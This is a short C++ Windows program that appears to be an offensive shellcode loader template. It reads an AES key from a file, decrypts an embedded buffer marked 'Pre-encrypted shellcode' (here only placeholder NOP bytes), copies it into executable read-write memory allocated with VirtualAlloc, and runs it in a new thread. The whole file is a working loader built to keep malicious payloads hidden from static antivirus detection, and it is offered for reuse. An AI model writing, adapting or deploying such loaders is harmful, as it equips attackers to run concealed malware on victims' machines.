#include <Windows.h>
#include "AES.h" // https://github.com/SergeyBel/AES

int main() {
	// Change me! Pre-encrypted shellcode
	unsigned char cipheredBuffer[] =
	  { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };

	unsigned char key[0x10];
	FILE *f;

	// Loading key from external file
	fopen_s(&f, "key.bin","rb");
	fread(key,sizeof(key),1,f);
	fclose(f);

	unsigned int size = sizeof(cipheredBuffer);

	// Decrypt payload
	AES aes(128);
	unsigned char* decipheredBuffer = aes.DecryptECB(cipheredBuffer, size, key);

	// Allocate memory
	LPVOID basePageAddress = VirtualAlloc( NULL, (SIZE_T)size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

	if (basePageAddress == NULL) {
		return 1;
	}

	// Write memory
	memcpy( basePageAddress, decipheredBuffer, (size_t)size );

	// Create thread that points to shellcode
	CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)basePageAddress, NULL, 0, NULL ); 

	//Wait for the thread to run
	Sleep(1000);
	
	return 0;
}
